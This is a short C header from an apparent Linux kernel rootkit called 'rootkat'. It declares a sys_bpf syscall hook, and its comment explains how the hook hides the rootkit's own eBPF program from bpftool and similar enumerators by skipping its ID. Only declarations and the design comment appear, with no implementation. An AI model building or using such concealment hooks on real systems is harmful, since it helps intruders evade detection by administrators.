/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_SYS_BPF_H
#define ROOTKAT_HOOK_SYS_BPF_H

/*
 * sys_bpf hook — hides our eBPF program from `bpftool prog list` and
 * any other enumerator that walks BPF prog IDs via the syscall.
 *
 * Identifies our prog by name match against ROOTKAT_HIDDEN_BPF_NAME
 * (the SEC name of our hide_file program). Post-processes
 * BPF_PROG_GET_NEXT_ID by re-querying with start_id advanced past any
 * hidden prog, so iterators see a contiguous-looking ID space minus our
 * entry.
 */
#define ROOTKAT_HIDDEN_BPF_NAME "hide_file_open"

int rootkat_hook_sys_bpf_install(void);
void rootkat_hook_sys_bpf_remove(void);

#endif
